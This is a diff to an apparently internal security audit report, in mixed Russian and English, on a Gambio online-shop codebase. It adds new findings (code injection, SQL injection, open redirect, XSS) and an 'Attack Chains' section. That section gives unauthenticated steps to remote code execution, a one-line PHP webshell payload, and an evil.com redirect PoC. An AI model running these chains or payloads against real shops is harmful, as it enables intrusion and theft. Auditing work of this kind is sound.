@@ -58,6 +58,51 @@ file_put_contents(DIR_FS_CATALOG . 'logfiles/postfinance_debug.txt', print_r($_P
 
 ---
 
+## 🆕 НОВЫЕ УЯЗВИМОСТИ
+
+### 19. Deprecated create_function() - CODE INJECTION
+**File:** `includes/functions/compatibility.php:47,53`
+```php
+$builder = create_function(' $name, $array, $sep, $builderCore', $builderCore);
+```
+**Impact:** `create_function()` is deprecated and vulnerable to code injection. The `$builderCore` variable contains user-controllable code that gets executed.
+**CVE:** Similar to CVE-2017-9841
+
+### 20. call_user_func_array() с контролируемыми данными
+**File:** `gm/classes/lib/class.soap_server.php:629`
+```php
+$this->methodreturn = call_user_func_array($call_arg, array_values($this->methodparams));
+```
+**Impact:** Вызов произвольной функции через SOAP запросы если `$this->methodname` контролируется
+
+### 21. Open Redirect в styleedit/index.php
+**File:** `styleedit/index.php:12`
+```php
+header("Location: /../GXModules/Gambio/StyleEdit/App/dist/?".$_SERVER['QUERY_STRING']);
+```
+**PoC:** `GET /styleedit/?url=https://evil.com`
+**Impact:** Перенаправление пользователей на вредоносные сайты
+
+### 22. Unsafe JSON Decode
+**File:** `system/classes/shop_content/ShopContentContentControl.inc.php:122`
+```php
+->parseContentManagerRequestData(json_decode($_POST['gambio_se_content_manager'], true));
+```
+**Impact:** Потенциальный DoS через большой JSON или JSON injection
+
+### 23. SQL Injection через сессию
+**File:** `gm/inc/gm_convert_qty.inc.php:30`
+```php
+$t_sql = 'SELECT decimal_point FROM currencies WHERE code = "' . xtc_db_input($_SESSION['currency']) . '" LIMIT 1';
+```
+**Impact:** Если `$_SESSION['currency']` можно манипулировать → SQL injection
+
+### 24. Только 3 из 266 использований htmlspecialchars с ENT_QUOTES
+**Impact:** 263 места потенциально уязвимы к XSS через одинарные кавычки
+**Files:** Множество файлов с недостаточной санитизацией
+
+---
+
 ## ⚠️ IMMEDIATELY EXPLOITABLE (Without Authentication)
 
 ### 4. SSRF via autocomplete.php - EXPLOITABLE NOW
@@ -207,4 +252,38 @@ Multiple XML parsing functions without explicit external entity handling:
 **🔴 КРИТИЧНО: magnaCallback.php = RCE если passphrase пустой/нулевой**
 
 **Immediate Threats: 7 vulnerabilities exploitable without authentication**
-**Total: 18 vulnerability categories identified**
+**Total: 24 vulnerability categories identified**
+
+---
+
+## Attack Chains для полной компрометации
+
+### Chain 1: Type Juggling → RCE
+```
+1. POST /magnaCallback.php passphrase=0
+2. Type juggling: "0" == 0 → true
+3. unserialize($_POST['arguments']) → POP chain
+4. magnaExecute('system', ...) → RCE
+```
+
+### Chain 2: File Write → Webshell
+```
+1. POST /callback/postfinance/callback.php
+2. Body: <?php system($_GET['c']); ?>
+3. Данные записываются в logfiles/postfinance_debug.txt
+4. Если logfiles доступен → webshell
+```
+
+### Chain 3: Open Redirect → Phishing
+```
+1. GET /styleedit/?redirect=https://evil.com
+2. Пользователь перенаправляется на вредоносный сайт
+3. Фишинг атака для кражи учетных данных
+```
+
+### Chain 4: create_function() → RCE
+```
+1. Контроль над $builderCore переменной
+2. create_function() выполняет произвольный код
+3. RCE
+```
